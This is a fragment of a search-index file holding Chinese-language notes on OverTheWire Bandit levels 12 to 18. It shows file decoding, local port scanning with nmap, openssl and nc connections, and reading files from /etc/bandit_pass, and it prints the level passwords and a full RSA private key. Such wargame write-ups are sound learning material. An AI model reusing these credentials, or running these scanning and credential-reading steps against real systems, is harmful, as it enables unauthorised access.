JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv","title":"level12"},{"location":"WarGame/bandit/#level13","text":"\u6709\u70b9\u513f\u590d\u6742\u554a\uff0c\u95ee\u7684chatgpt\u7136\u540e\u624d\u4f1a\u7684 # \u5148mkdir\u7136\u540ecp bandit12@bandit:~$ cd /tmp/myname123 bandit12@bandit:/tmp/myname123$ xxd -r /tmp/myname123/data.txt > /tmp/myname123/data.bin bandit12@bandit:/tmp/myname123$ file /tmp/myname123/data.bin /tmp/myname123/data.bin: gzip compressed data, was \"data2.bin\", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 581 bandit12@bandit:/tmp/myname123$ gzip -d -S .bin /tmp/myname123/data.bin bandit12@bandit:/tmp/myname123$ ll total 10628 drwxrwxr-x 2 bandit12 bandit12 4096 Jul 17 03:01 ./ drwxrwx-wt 3791 root root 10801152 Jul 17 03:03 ../ -rw-rw-r-- 1 bandit12 bandit12 0 Jul 17 02:39 bandit -rw-rw-r-- 1 bandit12 bandit12 581 Jul 17 02:59 data -rw-rw-r-- 1 bandit12 bandit12 20480 Jul 16 19:05 data5.tar -rw-r--r-- 1 bandit12 bandit12 10240 Apr 23 18:04 data6.tar -rw-r--r-- 1 bandit12 bandit12 10240 Apr 23 18:04 data8.tar -rw-r--r-- 1 bandit12 bandit12 49 Apr 23 18:04 data9 -rw-rw-r-- 1 bandit12 bandit12 581 Jul 16 15:25 data.bz2 -rw-r----- 1 bandit12 bandit12 2642 Jul 16 19:00 data.hex -rw-r----- 1 bandit12 bandit12 2642 Jul 17 02:50 data.txt -rw-r----- 1 bandit12 bandit12 2642 Jul 17 02:34 mydata.txt bandit12@bandit:/tmp/myname123$ cat data9 The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw bandit12@bandit:/tmp/myname123$","title":"level13"},{"location":"WarGame/bandit/#level14","text":"\u6c34\uff0c\u7528\u79c1\u94a5\u767b\u5f55 bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p 2220 The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit13/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server with a password on port 2220 from localhost. !!! Connecting from localhost is blocked to conserve resources. !!! Please log out and log in again. ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! bandit14@bandit:~$","title":"level14"},{"location":"WarGame/bandit/#level15","text":"nc\u8fd9\u4e2a\u547d\u4ee4\u5728\u590d\u6742\u60c5\u51b5\u4e0b\u9700\u8981\u81ea\u5df1\u5199http\u8bf7\u6c42\u7684\u5185\u5bb9\uff0c\u633a\u79bb\u8c31\u7684\uff0c\u8fd8\u662fcurl\u548cpython\u65b9\u4fbf \u4e00\u4e9b\u5b66\u4e60\u7684\u94fe\u63a5 https://juejin.cn/post/6995203632387866631 \u3001 https://www.runoob.com/linux/linux-comm-nc.html \uff0c\u66f4\u591a\u5185\u5bb9\u53ef\u4ee5\u53c2\u8003CSE365 sp23\u7684 talking web \u6a21\u5757\u3002 bandit14@bandit:/etc/bandit_pass$ cat bandit14 fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq bandit14@bandit:/etc/bandit_pass$ cat bandit14 | nc localhost 30000 Correct! jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt bandit14@bandit:/etc/bandit_pass$","title":"level15"},{"location":"WarGame/bandit/#level16","text":"bandit14@bandit:echo \"jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt\" | openssl s_client -connect localhost:30001 -ign_eof Correct! JQttfApK4SeyHwDlI9SXGR50qclOAil1 closed","title":"level16"},{"location":"WarGame/bandit/#level17","text":"bandit16@bandit:~$ nmap -sV localhost -T5 -p 31000-32000 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-17 04:20 UTC Nmap scan report for localhost (127.0.0.1) Host is up (0.00015s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 31046/tcp open echo 31518/tcp open ssl/echo 31691/tcp open echo 31790/tcp open ssl/unknown 31960/tcp open echo 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31790-TCP:V=7.80%T=SSL%I=7%D=7/17%Time=64B4C185%P=x86_64-pc-linux-g SF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu SF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the SF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Plea SF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest, SF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\ SF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x SF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20 SF:correct\\x20current\\x20password\\n\")%r(TerminalServerCookie,31,\"Wrong!\\x2 SF:0Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(TLSSess SF:ionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20pa SF:ssword\\n\")%r(Kerberos,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x SF:20current\\x20password\\n\")%r(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20e SF:nter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(LPDString,31,\"Wrong SF:!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(LDA SF:PSearchReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x SF:20password\\n\")%r(SIPOptions,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20cor SF:rect\\x20current\\x20password\\n\"); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 98.85 seconds \u7136\u540e\uff0c\u8981\u8f93\u516516\u7684\u5bc6\u7801 bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) Can't use SSL_get_servername depth=0 CN = localhost verify error:num=18:self-signed certificate verify return:1 depth=0 CN = localhost verify error:num=10:certificate has expired notAfter=Jul 17 03:32:59 2023 GMT verify return:1 depth=0 CN = localhost notAfter=Jul 17 03:32:59 2023 GMT verify return:1 --- Certificate chain 0 s:CN = localhost i:CN = localhost a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1 v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04 QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63 QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA /Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ 2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0 qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d /H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI Vpv3P9pqfmYjEQjp7yIz -----END CERTIFICATE----- subject=CN = localhost issuer=CN = localhost --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 1339 bytes and written 373 bytes Verification error: certificate has expired --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 2048 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 10 (certificate has expired) --- --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: AD5693D41623D8997CC2EE94B1CC7C61F949EFBC34B80DC8421E8B82C6572B65 Session-ID-ctx: Resumption PSK: AFE5847E9831517B3B0BCF4B511501803A902004393C9D3D926CA22524CCE716B6A771D7802C706EF3C94E8C264D4B95 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - c4 53 bd cd 78 c9 dd 28-f5 14 4c 9d 30 a0 18 97 .S..x..(..L.0... 0020 - 5d d6 5b 92 2f 96 7a 0e-ac e2 49 bc e3 d1 a6 79 ].[./.z...I....y 0030 - 73 37 ea 00 c4 4f 0a 07-4c 4e b9 f8 f4 fe 04 bd s7...O..LN...... 0040 - cb a9 f5 31 28 a1 b9 07-fd cb 83 8b 8d 93 b8 7f ...1(........... 0050 - 51 10 1a b9 7c 4e 10 ab-4b 93 8c c7 88 9f 6e 85 Q...|N..K.....n. 0060 - 87 e8 fc bc 3d f7 93 f0-2f 55 1d cf 64 80 7c 08 ....=.../U..d.|. 0070 - f2 1c 95 b9 d1 3f 15 90-57 e1 b1 9e 93 87 1d 72 .....?..W......r 0080 - 93 ed 83 b8 4b ef d2 bd-1d f5 ca 1b f9 d6 7a ff ....K.........z. 0090 - 13 fd 8f 40 43 fe 97 99-2a fa eb f9 52 ad b0 27 ...@C...*...R..' 00a0 - be 2a a0 5c a7 fd 76 6a-22 58 a4 56 02 e7 f2 13 .*.\\..vj\"X.V.... 00b0 - 4b 01 58 44 ab 63 3d 3d-fa 7e f7 ac 66 8c ef da K.XD.c==.~..f... 00c0 - 79 db d0 58 9f c1 fe 8c-3f 95 19 ed a6 f6 08 e8 y..X....?....... Start Time: 1689568148 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 731D8DE5B4509BB39289FED6CED817A731462808EFAF8C604A5BEE6E85CD12AB Session-ID-ctx: Resumption PSK: F18769CA70C1B23B9CAFAD3D8682E406B83AF8FC439A378D79ABBB19CD4B59EE837D9121AB1BA7FCCF1F761FA4AFB8F7 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - 23 10 a4 f3 c5 e4 25 65-c5 73 a7 ce d3 1b 98 bf #.....%e.s...... 0020 - 1a 41 ff b2 2e 44 0f c6-a2 7c a6 12 0c 22 7a a9 .A...D...|...\"z. 0030 - 28 d6 09 17 d2 7a 97 5b-a3 37 fc 5c de 86 24 47 (....z.[.7.\\..$G 0040 - 78 20 db 23 15 d1 3d 77-19 b2 91 dc c7 43 d6 66 x .#..=w.....C.f 0050 - 3c 04 a7 dd b9 32 e6 0f-16 a1 ab dd 92 99 18 e7 <....2.......... 0060 - 23 ad ab 79 3e af 2d ca-ea 4e 29 67 27 39 d2 d4 #..y>.-..N)g'9.. 0070 - e9 6f e0 5b be 0d d4 2d-07 e2 83 10 4a aa 94 20 .o.[...-....J.. 0080 - 1e 06 3d 42 df 74 91 99-43 cc bc ca 5c 59 74 f1 ..=B.t..C...\\Yt. 0090 - df 00 c4 16 44 2d a1 0f-db db 65 84 3b 89 58 b4 ....D-....e.;.X. 00a0 - 81 71 91 ec 5c 5e a3 db-51 25 b4 37 e5 0d 6b 41 .q..\\^..Q%.7..kA 00b0 - 88 a8 dc 9d b3 02 5b 68-04 4c 01 cd cd a3 17 24 ......[h.L.....$ 00c0 - 4a fe f5 03 49 ab 60 1e-b3 eb 07 04 92 c5 ff ab J...I.`......... Start Time: 1689568148 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK Wrong! Please enter the correct current password closed \u662f\u4ece\u8fd9\u91cc\u770b\u51fa\u6765\u8981\u8f93\u5165\u5bc6\u7801\u7684\uff01 bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) Can't use SSL_get_servername depth=0 CN = localhost verify error:num=18:self-signed certificate verify return:1 depth=0 CN = localhost verify error:num=10:certificate has expired notAfter=Jul 17 03:32:59 2023 GMT verify return:1 depth=0 CN = localhost notAfter=Jul 17 03:32:59 2023 GMT verify return:1 --- Certificate chain 0 s:CN = localhost i:CN = localhost a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1 v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04 QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63 QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA /Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ 2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0 qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d /H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI Vpv3P9pqfmYjEQjp7yIz -----END CERTIFICATE----- subject=CN = localhost issuer=CN = localhost --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 1339 bytes and written 373 bytes Verification error: certificate has expired --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 2048 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 10 (certificate has expired) --- --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 1B8DD2D7E7B861C8494FB2E901FEB50552571BFE7200C45C57EEACE66795AEEA Session-ID-ctx: Resumption PSK: 25F7290250EB5F41F5C184E597BD8493DFD4EC4E8965B10CE6A409D2909B370F30DB9A1E965F680CCD6F9C9E3BC4D0C6 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - a1 6b 8c 90 89 4b 8b e8-df 1e 82 05 28 ad a8 5f .k...K......(.._ 0020 - 65 f3 03 76 14 8f d5 97-8a a5 28 ea 20 2f 06 55 e..v......(. /.U 0030 - 16 ba 4b 88 de ab 7e 00-1c 76 ba 08 b1 e7 0f a9 ..K...~..v...... 0040 - 1d 53 2a 31 16 6b 02 0d-2e dd e7 9a f4 9a e8 13 .S*1.k.......... 0050 - 13 a1 20 67 4c 24 07 53-18 c1 68 56 30 f4 92 c3 .. gL$.S..hV0... 0060 - b5 5b a6 4d 99 ff 16 fd-30 72 9b 0e f7 f2 c6 ab .[.M....0r...... 0070 - 69 c1 c0 b9 16 18 3d 5c-c4 db 4f b9 06 bf 6c 6f i.....=\\..O...lo 0080 - 51 c4 99 60 fa 03 55 af-ad 46 ed e1 53 0f 92 65 Q..`..U..F..S..e 0090 - 57 82 b9 5b ce 5b 40 37-4f d5 a8 a3 27 63 b9 2d W..[.[@7O...'c.- 00a0 - 6b e4 ea 11 f2 9f c3 f7-82 3d 16 4e 2b 40 d3 25 k........=.N+@.% 00b0 - 50 10 0f aa 74 30 49 da-c8 01 32 23 c0 b7 3c 8b P...t0I...2#..<. 00c0 - 97 8d 24 10 2d 93 73 04-33 01 d9 70 92 26 4e fc ..$.-.s.3..p.&N. Start Time: 1689568162 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: A0EF32E17C1AC0960FD46EE50181836B83644B2168CDC3087A3612EC77D9A111 Session-ID-ctx: Resumption PSK: 117786B647299C2A691BD342EDC8E39A7899490BE868D804415203AED03876A67C51CE8E55D236DAC96130391C36759A PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - f3 b6 fd 9d 6e e3 35 98-ad 1d df 9e 75 38 c5 47 ....n.5.....u8.G 0020 - 15 7a c4 8f 31 3b 39 1e-ef 1c f2 56 f2 61 48 a9 .z..1;9....V.aH. 0030 - 36 ae 3d 66 e9 0d 0f ff-07 39 33 77 d7 87 8c 63 6.=f.....93w...c 0040 - fb 00 ab 1e 27 3a 91 ed-24 49 b6 e2 9d 49 a6 2b ....':..$I...I.+ 0050 - 90 ce a6 8b ea 1c bd f5-38 77 83 fc 9b 4c b4 49 ........8w...L.I 0060 - 3b d9 7c bb 52 0b 2d 38-88 a5 80 b0 8e 80 5d 66 ;.|.R.-8......]f 0070 - 1e 0b 9d 10 b2 81 11 51-0a 30 60 ec b9 2d d2 5e .......Q.0`..-.^ 0080 - 64 66 87 44 84 78 f8 e5-2b 62 cb 5f 84 aa 50 01 df.D.x..+b._..P. 0090 - 5d d6 62 fd e8 8b f8 fc-91 0c 8a f9 a7 12 6e ae ].b...........n. 00a0 - b9 40 f2 4f 90 01 0e 30-cf bf 16 3a b5 96 fc 3a .@.O...0...:...: 00b0 - 9b a5 e0 4a 54 df eb 39-68 be 05 77 6b 50 d7 a3 ...JT..9h..wkP.. 00c0 - 87 0e 7d bf 33 1a 9e 31-40 b6 3e 5e 1f a9 cf d6 ..}.3..1@.>^.... Start Time: 1689568162 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK JQttfApK4SeyHwDlI9SXGR50qclOAil1 Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY----- closed \u8fd4\u56de\u4e86\u6b63\u786e\u7684\u5bc6\u94a5\uff0c\u7136\u540e\u5199\u5165/tmp\u4e0b\u7684\u67d0\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u7ed9\u5b83\u53ea\u6709\u81ea\u5df1\u53ef\u8bfb\u53ef\u5199\u5373\u53ef # \u9996\u5148\u9700\u8981\u5728tmp\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u628a\u5bc6\u94a5\u5199\u8fdb\u53bb\uff0c\u7136\u540echmod 666\u90a3\u4e2a\u6587\u4ef6 bandit16@bandit:/tmp/a$ ssh -i 1.private bandit17@localhost -p 2220 --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! bandit17@bandit:~$","title":"level17"},{"location":"WarGame/bandit/#level18","text":"\u76f4\u63a5diff bandit17@bandit:~$ diff passwords.old passwords.new 42c42 < glZreTEH1V3cGKL6g4conYqZqaEj0mte --- > hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg bandit17@bandit:~$ \u7136\u540e\u767b\u5f55\uff0c\u7136\u540e\u5c31\u662f\uff1a \u250c\u2500[myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[13:02:46]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools 